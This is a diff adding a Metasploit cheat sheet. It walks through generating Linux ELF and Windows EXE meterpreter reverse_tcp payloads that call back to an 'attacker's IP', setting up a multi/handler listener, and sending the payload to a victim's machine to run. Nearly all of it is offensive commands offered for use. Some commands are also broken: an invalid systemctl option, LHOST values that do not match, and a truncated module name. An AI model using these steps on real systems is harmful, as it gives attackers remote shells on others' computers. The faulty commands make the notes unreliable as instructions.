@@ -1,0 +1,102 @@
+=========================================
+METASPLOIT SETUP
+=========================================
+
+
+----------------------------------------------------
+IF Metasploit does not work
+----------------------------------------------------
+sudo systemctl --reinstall metasploit-framework -y
+
+----------------------------------------------------
+STEP 1: START DATABASE
+----------------------------------------------------
+
+sudo systemctl restart postgresql
+
+Initialize Metasploit Database (first time):
+
+msfdb init
+
+OR Reinitialize Database:
+
+msfdb reinit
+
+----------------------------------------------------
+STEP 2: START METASPLOIT
+----------------------------------------------------
+
+msfconsole
+
+----------------------------------------------------
+LINUX
+----------------------------------------------------
+
+msf > use payload/linux/x64/meterpreter/reverse_tcp 
+msf payload(linux/x64/meterpreter/reverse_tcp) > options
+msf payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 192.168.74.52  #<attacker's IP>
+
+msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o /home/kali/payloads/pay.elf
+
+msf payload(linux/x64/meterpreter/reverse_tcp) > back
+
+msf > use multi/handler
+
+msf exploit(multi/handler) > set LHOST 192.168.74.117
+
+msf exploit(multi/handler) > set LPORT 9696
+
+msf exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+
+msf exploit(multi/handler) > exploit
+
+
+----------------------------------------------------
+WINDOWS
+----------------------------------------------------
+
+msf > use payload/windows/x64/meterpreter/reverse_tcp 
+msf payload(windows/x64/meterpreter/reverse_tcp) > options
+msf payload(windows/x64/meterpreter/reverse_tcp) > set LHOST 192.168.74.52  #<attacker's IP>
+
+msf payload(windows/x64/meterpreter/reverse_tc) > generate -f exe -o /home/kali/payloads/win.exe
+
+msf exploit(multi/handler) > set LHOST 192.168.74.117
+
+msf exploit(multi/handler) > set LPORT 9696
+
+msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+msf exploit(multi/handler) > exploit
+
+
+
+Sent the payload to victims machine and 
+chmod +x pay.elf
+./pay.elf
+
+
+----------------------------------------------------
+COMMON MSFCONSOLE COMMANDS
+----------------------------------------------------
+
+help            # Show help
+search <name>   # Search modules
+use <module>    # Select a module
+show options    # Display required options
+set <option>    # Set an option
+run             # Execute auxiliary modules
+exploit         # Launch an exploit module
+back            # Return to previous menu
+sessions        # List active sessions
+jobs            # Show background jobs
+exit            # Exit Metasploit
+
+
+
+
+
+
+
+
+
